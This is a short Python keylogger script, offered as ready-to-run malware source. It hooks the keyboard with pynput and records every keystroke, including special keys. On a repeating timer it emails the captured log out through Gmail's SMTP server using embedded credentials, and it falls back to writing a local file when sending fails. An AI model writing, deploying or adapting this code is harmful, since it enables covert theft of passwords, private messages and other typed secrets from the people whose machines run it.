#!/usr/bin/env python3
import pynput.keyboard
import threading
import smtplib

class Keylogger:
    def __init__(self,time_interval,email,password):
        print('\----------------------------------------------------------------------/\nWelcome to KeyLogger Script\n')
        self.log = "-----------Key logger is started-----------------\n"
        self.time_interval = time_interval
        self.email= email
        self.password = password
        self.start()

    def send_mail(self,email,password,message):
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(email,password)
        server.sendmail(email,email,message)
        server.quit()
    def write_log(self,log):
        with open("log1.txt","w") as outlog:
            outlog.write(log)
    def append_to_log(self,string):
        self.log = self.log + string

    def process_key_press(self,key):
        try:
            current_key = str(key.char)
        except:
            if key == key.space:
                current_key = " "
            else:
                current_key=" " + str(key) + " "

        self.append_to_log(current_key)

    def report(self):
        try:
            try:
                self.send_mail(self.email,self.password,self.log)
            except KeyboardInterrupt:
                print("[+]Detected CTRL+C and Key Logger is stoped..")
        except:
            try:
                self.write_log(self.log)
            except KeyboardInterrupt:
                print("[+]Detected CTRL+C and Key Logger is stoped..")
        self.log = ""
        timer=threading.Timer(self.time_interval,self.report)
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()